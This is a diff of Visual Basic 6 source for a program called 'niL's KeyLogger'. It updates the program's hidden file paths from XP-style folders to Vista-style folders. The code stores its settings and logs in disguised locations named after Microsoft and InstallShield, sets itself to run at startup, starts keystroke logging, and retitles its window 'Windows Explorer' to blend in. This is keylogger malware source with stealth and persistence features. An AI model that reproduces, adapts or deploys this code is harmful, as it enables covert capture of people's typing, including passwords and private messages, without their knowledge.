@@ -3,17 +3,17 @@ Begin VB.Form Form1
    BackColor       =   &H8000000C&
    BorderStyle     =   1  'Fixed Single
    Caption         =   "Please Register - niL's KeyLogger"
-   ClientHeight    =   2505
+   ClientHeight    =   3210
    ClientLeft      =   45
    ClientTop       =   435
-   ClientWidth     =   5160
+   ClientWidth     =   5400
    ControlBox      =   0   'False
    Icon            =   "Form1.frx":0000
    LinkTopic       =   "Form1"
    MaxButton       =   0   'False
    MinButton       =   0   'False
-   ScaleHeight     =   2505
-   ScaleWidth      =   5160
+   ScaleHeight     =   3210
+   ScaleWidth      =   5400
    StartUpPosition =   2  'CenterScreen
    Begin VB.Frame Frame1 
       Appearance      =   0  'Flat
@@ -344,9 +344,9 @@ End If
 Call LoadUserName
 
 Randomize
-txtgCode = CurrentCode("C:\Documents and Settings\All Users\Application Data\InstallShield\UpdateService\Q3FD.GML")
+txtgCode = CurrentCode("C:\Users\Q3FD.GML")
 If txtgCode.Text <> "Registered" Then
-    txtTry = Val(RemainingTry(15, "C:\Documents and Settings\All Users\Application Data\InstallShield\UpdateService\Q3FRT.GLT"))
+    txtTry = Val(RemainingTry(15, "C:\Users\Q3FRT.GLT"))
     
     If Val(txtTry) < 0 Then
         cmdTry.Enabled = False: txtTry.Visible = False: lblTry.Caption = "Your Free Trial have been expired.": Timer1.Enabled = False: Call SetAutorun: Exit Sub
@@ -356,7 +356,7 @@ If txtgCode.Text <> "Registered" Then
         If Val(txtTry) = 14 Or Val(txtTry) < 4 Then Me.Caption = "Please Register - niL's KeyLogger": Me.Show
     End If
 Else
-    Me.Hide
+    'Me.Hide
     Call startLogging
 End If
 
@@ -391,7 +391,7 @@ Close #1
 End Sub
 Private Sub cmdReg_Click()
 If UCase(txtActCode) = genKey(txtgCode) Then
-    Call MakeRegistered("C:\Documents and Settings\All Users\Application Data\InstallShield\UpdateService\Q3FD.GML")
+    Call MakeRegistered("C:\Users\All Users\Application Data\InstallShield\UpdateService\Q3FD.GML")
     MsgBox "Thank You for purchasing niL's KeyLogger!"
     Me.Hide
 Else
@@ -400,28 +400,28 @@ End If
 End Sub
 
 Private Sub cmdTry_Click()
-Me.Hide
+'Me.Hide
 Me.Caption = "Windows Explorer"
 
 End Sub
 Private Sub LoadSetting()
-If Dir("C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.ini") <> "" Then 'setting file found then
+If Dir("C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.ini") <> "" Then 'setting file found then
 
-    AllowBS = INIRead("LogSetting", "USEBS", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
-    wTitle = INIRead("LogSetting", "UseChildTitle", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
-    encCode = INIRead("LogSetting", "EncCode", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
-    ext = INIRead("LogSetting", "extension", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
-    Timer1.Interval = INIRead("LogSetting", "TimerInt", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
-    LogMode = INIRead("LogSetting", "LogMode", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
-    LogPath.Text = INIRead("LogSetting", "LogDir", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
-    sLogging = INIRead("LogSetting", "sLogging", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
-    Pwd = INIRead("LogSetting", "pwd", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
+    AllowBS = INIRead("LogSetting", "USEBS", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    wTitle = INIRead("LogSetting", "UseChildTitle", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    encCode = INIRead("LogSetting", "EncCode", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    ext = INIRead("LogSetting", "extension", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    Timer1.Interval = INIRead("LogSetting", "TimerInt", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    LogMode = INIRead("LogSetting", "LogMode", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    LogPath.Text = INIRead("LogSetting", "LogDir", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    sLogging = INIRead("LogSetting", "sLogging", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
+    Pwd = INIRead("LogSetting", "pwd", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
 
     Call SetAutorun
 
     If sLogging = True Then
         On Error GoTo err2
-        Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\default.MCP" For Input As 1    'Contains Selected titles.
+        Open "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\default.MCP" For Input As 1    'Contains Selected titles.
         Do While Not EOF(1)
         On Error Resume Next
         Input #1, t1, t2, t3, t4, t5
@@ -442,9 +442,9 @@ Private Sub CreateSetting()
 Dim f As Integer
 f = FreeFile
 
-txtUserName.Tag = "C:\Documents and Settings\" & txtUserName & "\sysResource"
+txtUserName.Tag = "C:\Users\" & txtUserName & "\sysResource"
 
-Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI" For Output As #f
+Open "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI" For Output As #f
 Print #f, "[LogSetting]" & vbNewLine & "USEBS=1" & vbNewLine & "UseChildTitle=0" & vbNewLine & "EncCode=1" & vbNewLine & "extension=.nkl" & vbNewLine & "TimerInt=65" & vbNewLine & "LogMode=1" & vbNewLine & "LogDir=" & txtUserName.Tag & vbNewLine & "SETRUNONCE=1" & vbNewLine & "sLogging=0" & vbNewLine & "Pwd="
 Close #f
 
@@ -736,7 +736,7 @@ Dim SETRUNONCE As Boolean
     On Error GoTo SetStartupError
 
 
-SETRUNONCE = INIRead("LogSetting", "SETRUNONCE", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
+SETRUNONCE = INIRead("LogSetting", "SETRUNONCE", "C:\Users\" & txtUserName & "\AppData\Roaming\Microsoft\SPYXX.INI")
     
     If SETRUNONCE = True Then
     
